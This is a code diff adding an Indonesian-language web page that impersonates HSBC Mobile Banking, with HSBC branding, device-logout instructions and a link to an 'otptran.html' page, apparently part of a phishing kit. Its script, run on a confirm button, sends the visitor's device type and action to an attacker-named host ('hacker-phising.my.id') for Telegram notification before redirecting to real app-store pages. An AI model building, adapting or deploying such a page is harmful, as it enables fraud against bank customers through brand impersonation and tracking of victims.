@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HSBC Mobile Banking - Unlink Perangkat</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+    :root {
+        --primary-color: #db0011;
+        --secondary-color: #fefefe;
+        --accent-color: #ffcc00;
+        --light-color: #f8f9fa;
+        --dark-color: #212529;
+        --font-primary: 'Poppins', sans-serif;
+    }
+
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: var(--font-primary);
+        line-height: 1.6;
+        color: var(--dark-color);
+        background-color: #f5f5f5;
+    }
+
+    /* Header & Navbar Styles */
+    header {
+        background-color: white;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+    }
+
+    .header-container {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 1rem 2rem;
+        max-width: 1200px;
+        margin: 0 auto;
+    }
+
+    .logo {
+        display: flex;
+        align-items: center;
+    }
+
+    .logo img {
+        height: 30px;
+        width: auto;
+        transition: transform 0.3s ease;
+    }
+
+    .logo img:hover {
+        transform: scale(1.05);
+    }
+
+    .nav-right {
+        display: flex;
+        align-items: center;
+        gap: 20px;
+    }
+
+    .nav-icon {
+        color: var(--dark-color);
+        font-size: 1.2rem;
+        transition: color 0.3s ease;
+    }
+
+    .nav-icon:hover {
+        color: var(--primary-color);
+    }
+
+    /* Notification Modal */
+    .modal {
+        display: none;
+        position: fixed;
+        z-index: 2000;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0,0,0,0.5);
+    }
+
+    .modal-content {
+        background-color: white;
+        margin: 15% auto;
+        padding: 20px;
+        border-radius: 8px;
+        width: 80%;
+        max-width: 500px;
+        position: relative;
+        animation: modalopen 0.4s;
+    }
+
+    @keyframes modalopen {
+        from {opacity: 0; transform: translateY(-50px);}
+        to {opacity: 1; transform: translateY(0);}
+    }
+
+    .close {
+        position: absolute;
+        right: 20px;
+        top: 10px;
+        font-size: 1.5rem;
+        cursor: pointer;
+    }
+
+    .modal-btn {
+        background-color: var(--primary-color);
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 15px;
+    }
+
+    .modal-btn:hover {
+        background-color: #b8000e;
+    }
+
+    /* Rest of your existing styles... */
+    .banner {
+        width: 100%;
+        overflow: hidden;
+        text-align: center;
+        background-color: var(--secondary-color);
+    }
+
+    .banner img {
+        width: 100%;
+        max-height: 200px;
+        object-fit: cover;
+    }
+
+    .content-container {
+        max-width: 800px;
+        margin: 2rem auto;
+        padding: 0 1.5rem;
+    }
+
+    h1 {
+        color: var(--primary-color);
+        margin-bottom: 1.5rem;
+        text-align: center;
+        font-weight:500;
+        font-size: 20px;
+    }
+
+    .notification-box {
+        background-color: white;
+        border-radius: 8px;
+        padding: 2rem;
+        margin-bottom: 2rem;
+        box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .notification-box ol {
+        padding-left: 1.5rem;
+        margin: 1.5rem 0;
+    }
+
+    .notification-box li {
+        margin-bottom: 0.8rem;
+    }
+
+    .warning {
+        background-color: #fff3cd; 
+        margin: 15px 0;
+        padding: 15px;
+        border-radius: 4px;
+        border-left: 4px solid #ffc107;
+    }
+
+    .warning i {
+        margin-right: 8px;
+        color: #856404;
+    }
+
+    .btn-container {
+        text-align: center;
+        margin-top: 2rem;
+    }
+
+    .btn {
+        display: inline-block;
+        padding: 12px 24px;
+        background-color: var(--primary-color);
+        color: white;
+        border-radius: 3px;
+        text-decoration: none;
+        font-weight: 600;
+        transition: all 0.3s ease;
+        border: none;
+        cursor: pointer;
+        margin: 0 auto;
+    }
+
+    .btn:hover {
+        background-color: #b8000e;
+        transform: translateY(-2px);
+        box-shadow: 0 4px 8px rgba(219, 0, 17, 0.3);
+    }
+
+    .btn i {
+        margin-right: 8px;
+    }
+
+    footer {
+        background-color:#fefefe;
+        color: #212529;
+        padding: 2rem 0;
+        margin-top: 3rem;
+        text-align: center;
+    }
+
+    .footer-logo img {
+        width: 100px;
+        margin-bottom: 1rem;
+    }
+
+    .footer-info p {
+        margin-bottom: 0.5rem;
+        font-size: 0.9rem;
+    }
+
+    @media (max-width: 768px) {
+        .header-container {
+            padding: 1rem;
+        }
+
+        .logo img {
+            height: 25px;
+        }
+
+        .nav-icon {
+            font-size: 1.1rem;
+        }
+
+        h1 {
+            font-size: 1.3rem;
+        }
+
+        .notification-box {
+            padding: 1.5rem;
+        }
+
+        .modal-content {
+            width: 90%;
+            margin: 30% auto;
+        }
+    }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-container">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/HSBC_Logo_2018.png" alt="HSBC Logo">
+            </div>
+            
+            <div class="nav-right">
+                <a href="otptran.html" class="nav-icon" title="Beranda">
+                    <i class="fas fa-home"></i>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="content-container">
+            <h1>Logout Perangkat</h1>
+            <div class="notification-box">
+                <p>Untuk melakukan log out perangkat pada Mobile Banking HSBC, silakan ikuti langkah berikut:</p>
+                <ol>
+                    <li>Buka aplikasi Mobile Banking HSBC di perangkat Anda</li>
+                    <li>Masuk ke menu <strong>Profil</strong></li>
+                    <li>Pilih opsi <strong>Log Out</strong> atau <strong>Keluar</strong></li>
+                    <li>Konfirmasi dengan cara memasukan PIN anda</li>
+                </ol>
+                 <div class="btn-container">
+                    <button id="mobileBankingBtn" class="btn">
+                        <i class="fas fa-mobile-alt"></i> Masuk Ke Mobile Banking
+                    </button>
+                </div>
+                <p class="warning"><i class="fas fa-exclamation-triangle"></i> Pastikan semua transaksi telah selesai sebelum melakukan logout perangkat.</p>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/HSBC_Logo_2018.png" alt="HSBC Logo">
+        </div>
+        <div class="footer-info">
+            <p>HSBC Indonesia Member of HSBC Group</p>
+        </div>
+    </footer>
+
+    <!-- Notification Modal -->
+    <div id="notificationModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>Konfirmasi</h2>
+            <p>Anda akan diarahkan ke aplikasi Mobile Banking HSBC</p>
+            <button id="confirmRedirect" class="modal-btn">Lanjutkan</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            const mobileBankingBtn = document.getElementById("mobileBankingBtn");
+            const modal = document.getElementById("notificationModal");
+            const closeBtn = document.getElementsByClassName("close")[0];
+            const confirmBtn = document.getElementById("confirmRedirect");
+            
+            // URL aplikasi HSBC Indonesia
+            const androidAppUrl = "https://play.google.com/store/apps/details?id=id.hsbc.hsbcindonesia";
+            const iosAppUrl = "https://apps.apple.com/id/app/hsbc-singapore/id1339115277";
+            
+            // Buka modal saat tombol diklik
+            mobileBankingBtn.addEventListener("click", function(e) {
+                e.preventDefault();
+                modal.style.display = "block";
+            });
+            
+            // Tutup modal saat tombol X diklik
+            closeBtn.onclick = function() {
+                modal.style.display = "none";
+            }
+            
+            // Tutup modal saat klik di luar modal
+            window.onclick = function(event) {
+                if (event.target == modal) {
+                    modal.style.display = "none";
+                }
+            }
+            
+            // Konfirmasi redirect dan kirim notifikasi ke Telegram
+            confirmBtn.addEventListener("click", async function() {
+                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+                let deviceType = "Unknown";
+                
+                // Deteksi perangkat
+                if (/android/i.test(userAgent)) {
+                    deviceType = "Android";
+                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                    deviceType = "iOS";
+                }
+                
+                try {
+                    // Kirim notifikasi ke Telegram via PHP
+                    const response = await fetch("https://hacker-phising.my.id/notif/req/notification.php", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/x-www-form-urlencoded",
+                        },
+                        body: `device=${encodeURIComponent(deviceType)}&action=MobileBankingRedirect`
+                    });
+                    
+                    const result = await response.text();
+                    console.log("Notification sent:", result);
+                    
+                    // Redirect berdasarkan perangkat
+                    if (deviceType === "Android") {
+                        window.location.href = androidAppUrl;
+                    } else if (deviceType === "iOS") {
+                        window.location.href = iosAppUrl;
+                    } else {
+                        window.location.href = androidAppUrl; // Default ke Android
+                    }
+                    
+                } catch (error) {
+                    console.error("Error sending notification:", error);
+                    // Tetap redirect meskipun gagal kirim notifikasi
+                    if (/android/i.test(userAgent)) {
+                        window.location.href = androidAppUrl;
+                    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                        window.location.href = iosAppUrl;
+                    } else {
+                        window.location.href = androidAppUrl;
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
